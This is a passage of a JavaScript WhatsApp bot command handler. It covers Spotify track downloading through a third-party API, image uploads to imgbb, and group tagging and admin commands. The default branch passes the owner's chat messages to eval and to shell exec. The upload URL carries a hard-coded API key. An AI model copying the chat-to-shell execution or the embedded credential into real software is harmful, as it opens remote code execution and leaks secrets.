 if (!data) return famreply2("Lagu tidak ditemukan.");

 // Teks yang akan dikirimkan
 const tekswait = `*𝐒𝐩𝐨𝐭𝐢𝐟𝐲 𝐩𝐥𝐚𝐲𝐞𝐫*

- *Judul:* ${data.title}
- *Artis:* ${data.artist}
- *URL:* ${data.url}`;

 // Mengirim pesan informasi lagu
 await conn.sendMessage(m.chat, { 
 text: `${tekswait}`, 
 contextInfo: {
 mentionedJid: [m.sender],
 externalAdReply: { 
 showAdAttribution: true,
 title:`${data.title}`,
 body:"SPOTIFY SEARCH & DOWNLOAD",
 thumbnailUrl: data.thumbnail,
 mediaType: 1,
 renderLargerThumbnail: true
 }
 } 
 }, { quoted: m });

 // URL API untuk download lagu
 const downloadApiUrl = `https://spotifyapi.caliphdev.com/api/download/track?url=${encodeURIComponent(data.url)}`;
 // Mendapatkan data dari API
 let response = await fetch(downloadApiUrl);
 
 // Memastikan respon adalah tipe audio
 if (response.headers.get("content-type") === "audio/mpeg") {
 // Mengirim audio melalui WhatsApp
 await conn.sendMessage(m.chat, { audio: { url: downloadApiUrl }, mimetype: 'audio/mpeg' }, { quoted: m });
 } else {
 famreply2("Gagal mendapatkan file audio.");
 }
 } catch (error) {
 console.error(error);
 famreply2("Terjadi kesalahan saat mengambil file audio.");
 }
}
break
case "tourl": {
const axios = require("axios");
const FormData = require("form-data");
const fs = require("fs");
    if (!m.quoted || !m.quoted.mimetype || !m.quoted.mimetype.startsWith("image/")) {
        return famreply2("📌 براہ کرم کسی تصویر پر ریپلائے کریں تاکہ اسے لنک میں تبدیل کیا جا سکے!");
    }

    let media = await m.quoted.download();
    let tempFilePath = "./fam_ofc.jpg"; // Temporary file path

    fs.writeFileSync(tempFilePath, media); // Save the buffer as an image file

    let formData = new FormData();
    formData.append("image", fs.createReadStream(tempFilePath)); // Use createReadStream

    try {
        let response = await axios.post(
            "https://api.imgbb.com/1/upload?key=1fe5c36a643f15d1e5478c716f876a4c",
            formData,
            { headers: { ...formData.getHeaders() } }
        );

        fs.unlinkSync(tempFilePath); // Delete temp file after upload

        let data = response.data;
        if (data.success) {
            let imageUrl = data.data.url;
            famreply2(`✅ **Image Uploaded Successfully!**\n🔗 **URL:** ${imageUrl}`);
        } else {
            famreply2("⚠ تصویر کو لنک میں تبدیل کرنے میں خرابی ہوئی، دوبارہ کوشش کریں!");
        }
    } catch (error) {
        console.error("API Error:", error);
        famreply2("⚠ API سے کنکشن ناکام ہوگیا، دوبارہ کوشش کریں!");
    }
}
break

///new case by fam 

case "hidetag":
case "z": {
    if (!isCreator(sender)) return famreply2("❌ *Only the Owner can use this command!*");
    if (!isGroup) return famreply2("❌ *This command can only be used in groups!*");
    if (!text) return famreply2("📌 *Usage:* .hidetag <text>\nExample: .hidetag Hello everyone!");
    
    try {
        await conn.sendMessage(m.chat, {
            text: text,
            mentions: participants.map(a => a.id)
        }, { quoted: qloc });
    } catch (error) {
        console.error("Hidetag Command Error:", error);
        famreply2("❌ *Error:* Failed to send hidden tag message.");
    }
}
break;

case "tagall": {
    if (!isGroup) return famreply2("❌ *This command can only be used in groups!*");
    if (!isAdmins && !isCreator(sender)) return famreply2("❌ *Only group admins or the bot owner can use this command!*");
    if (!text) return famreply2("📌 *Usage:* .tagall <text>\nExample: .tagall Meeting at 5 PM!");
    
    try {
        let teks = `${text}\n\n`;
        for (let mem of participants) {
            teks += `⊝ @${mem.id.split('@')[0]}\n`;
        }
        await conn.sendMessage(m.chat, {
            text: teks,
            mentions: participants.map(a => a.id)
        }, { quoted: qloc });
    } catch (error) {
        console.error("Tagall Command Error:", error);
        famreply2("❌ *Error:* Failed to tag all members.");
    }
}
break;


case "closegroup":
case "close": {
    if (!isGroup) return famreply2("❌ *This command can only be used in groups!*");
    if (!isAdmins && !isCreator(sender)) return famreply2("❌ *Only group admins or the bot owner can use this command!*");
    if (!isBotAdmins) return famreply2("❌ *I need to be an admin to close the group!*");
    if (!args[0] || !args[1]) return famreply2("📌 *Usage:* .close <number> <second|minute|hour|day>\nExample: .close 10 second");

    let timer;
    if (args[1] === 'second') {
        timer = args[0] * 1000;
    } else if (args[1] === 'minute') {
        timer = args[0] * 60000;
    } else if (args[1] === 'hour') {
        timer = args[0] * 3600000;
    } else if (args[1] === 'day') {
        timer = args[0] * 86400000;
    } else {
        return famreply2("❌ *Invalid time unit!* Use second, minute, hour, or day.");
    }

    try {
        await famreply2("*Group closing in progress...*");
        setTimeout(async () => {
            await conn.groupSettingUpdate(m.chat, 'announcement');
            await famreply2("✅ *Group closed!* Only admins can send messages now.\n\n🔥 *Powered by FAM OFC*");
        }, timer);
    } catch (error) {
        console.error("Closegroup Command Error:", error);
        famreply2("❌ *Error:* Failed to close the group.");
    }
}
break;

case "opengroup":
case "open": {
    if (!isGroup) return famreply2("❌ *This command can only be used in groups!*");
    if (!isAdmins && !isCreator(sender)) return famreply2("❌ *Only group admins or the bot owner can use this command!*");
    if (!isBotAdmins) return famreply2("❌ *I need to be an admin to open the group!*");
    if (!args[0] || !args[1]) return famreply2("📌 *Usage:* .open <number> <second|minute|hour|day>\nExample: .open 10 second");

    let timer;
    if (args[1] === 'second') {
        timer = args[0] * 1000;
    } else if (args[1] === 'minute') {
        timer = args[0] * 60000;
    } else if (args[1] === 'hour') {
        timer = args[0] * 3600000;
    } else if (args[1] === 'day') {
        timer = args[0] * 86400000;
    } else {
        return famreply2("❌ *Invalid time unit!* Use second, minute, hour, or day.");
    }

    try {
        await famreply2("*Group opening in progress...*");
        setTimeout(async () => {
            await conn.groupSettingUpdate(m.chat, 'not_announcement');
            await famreply2("✅ *Group opened!* All members can send messages now.\n\n🔥 *Powered by FAM OFC*");
        }, timer);
    } catch (error) {
        console.error("Opengroup Command Error:", error);
        famreply2("❌ *Error:* Failed to open the group.");
    }
}
break;

case "addadmin": {
    if (!isGroup) return famreply2("❌ *This command can only be used in groups!*");
    if (!isAdmins && !isCreator(sender)) return famreply2("❌ *Only group admins or the bot owner can use this command!*");
    if (!isBotAdmins) return famreply2("❌ *I need to be an admin to promote members!*");

    let users;
    if (m.mentionedJid[0]) {
        users = m.mentionedJid[0];
    } else if (m.quoted) {
        users = m.quoted.sender;
    } else if (text) {
        users = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
    } else {
        return famreply2("📌 *Usage:* Reply to a member's message, mention them, or provide a number (e.g., .addadmin 923xxx).");
    }

    if (users === botNumber) return famreply2("❌ *I cannot promote myself!*");
    if (groupAdmins.includes(users)) return famreply2("❌ *User is already an admin!*");

    try {
        await conn.groupParticipantsUpdate(m.chat, [users], 'promote');
        await famreply2(`✅ *Promoted @${users.split('@')[0]} to admin!*\n\n🔥 *Powered by FAM OFC*`, {
            mentions: [users]
        });
    } catch (error) {
        console.error("Addadmin Command Error:", error);
        famreply2("❌ *Error:* Failed to promote the member.");
    }
}
break;

case "undadmin": {
    if (!isGroup) return famreply2("❌ *This command can only be used in groups!*");
    if (!isAdmins && !isCreator(sender)) return famreply2("❌ *Only group admins or the bot owner can use this command!*");
    if (!isBotAdmins) return famreply2("❌ *I need to be an admin to demote members!*");

    let users;
    if (m.quoted) {
        users = m.quoted.sender;
    } else if (text) {
        users = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
    } else {
        return famreply2("📌 *Usage:* Reply to a member's message or provide a number (e.g., .undadmin 923xxx).");
    }

    if (users === botNumber) return famreply2("❌ *I cannot demote myself!*");
    if (!groupAdmins.includes(users)) return famreply2("❌ *User is not an admin!*");

    try {
        await conn.groupParticipantsUpdate(m.chat, [users], 'demote');
        await famreply2(`✅ *Demoted @${users.split('@')[0]} from admin!*\n\n🔥 *Powered by FAM OFC*`, {
            mentions: [users]
        });
    } catch (error) {
        console.error("Undadmin Command Error:", error);
        famreply2("❌ *Error:* Failed to demote the member.");
    }
}
break;


case "cekidgc":
case "groupid": {
    if (!isCreator(sender)) return famreply2("❌ *Only the Owner can use this command!*");
    
    try {
        const getGroups = await conn.groupFetchAllParticipating();
        const groups = Object.values(getGroups);
        let teks = `⬣ *GROUP LIST*\n\nTotal Groups: ${groups.length}\n\n`;

        for (let group of groups) {
            teks += `◉ *Name:* ${group.subject}\n◉ *ID:* ${group.id}\n◉ *Members:* ${group.participants.length}\n────────────────────────\n`;
        }
        teks += `\n📌 *Note:* Copy the group ID for use in other commands.\n\n🔥 *Powered by FAM OFC*`;

        await famreply2(teks);
    } catch (error) {
        console.error("Cekidgc Command Error:", error);
        famreply2("❌ *Error:* Failed to fetch group list.");
    }
}
break;



default:
if (budy.startsWith('=>')) {
if (!isCreator(sender)) return
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == conn) {
bang = util.format(sul)
}
return famreply2(bang)
}
try {
famreply2(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
famreply2(String(e))
}
}


if (budy.startsWith('>')) {
if (!isCreator(sender)) return
let kode = budy.trim().split(/ +/)[0]
let teks
try {
teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
} catch (e) {
teks = e
} finally {
await famreply2(require('util').format(teks))
}
}

if (budy.startsWith('$')) {
if (!isCreator(sender)) return
exec(budy.slice(2), (err, stdout) => {
if (err) return famreply2(`${err}`)
if (stdout) return famreply2(stdout)
})
}

}
} catch (err) {
console.log(util.format(err))
}
}

const getAIResponse = async (userText, m) => {
    try {
        const apiUrl = `https://fam-official.serv00.net/sim/ai.php?text=${encodeURIComponent(userText)}`;
        const response = await axios.get(apiUrl);

        console.log("AI API Response:", response.data); // Debugging

        if (response.data && response.data.success) {
            return m.reply(`${response.data.message}`);
        } else {
            return m.reply(`⚠ *Error:* ${response.data.message || "AI response not available."}`);
        }
    } catch (error) {
        console.error("AI API Error:", error);
        return m.reply("⚠ *Error fetching AI response.*\nPlease try again later.");
    }
};


let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(`Update ${__filename}`)
delete require.cache[file]
require(file)
})
